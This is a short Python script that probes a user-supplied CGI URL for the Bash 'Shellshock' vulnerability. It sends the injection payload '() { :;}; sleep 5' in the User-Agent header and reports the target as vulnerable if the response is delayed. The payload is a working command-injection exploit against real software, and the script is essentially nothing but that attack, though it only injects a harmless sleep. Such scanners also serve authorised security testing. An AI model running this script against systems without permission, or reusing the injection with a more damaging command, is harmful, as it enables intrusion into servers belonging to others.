#!/usr/bin/env python
import sys
import requests
from time import time

class color:
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    end = '\033[0m'

# Variable for sleep time that will be injected, change as needed.
sleep_time = 5

url = ""
try:
	url = sys.argv[1]
except:
	print "\n{0}Missing required url argument{1}".format(color.yellow,color.end)
	print "Ex: ./shocknaww.py http://site.com/cgi-bin/test"

	sys.exit()


shock = requests.Session()

payload = "() { :;}; sleep "+str(sleep_time)
headers = {"User-Agent": payload}

start = time()
response = shock.get(url, headers=headers)


delay = time() - start

if delay > sleep_time:
	print "{0}{1} appears to be vulnerable{2}".format(color.red, url, color.end)
else:
	print "{0}{1} is not vulnerable.{2}".format(color.green, url, color.end)
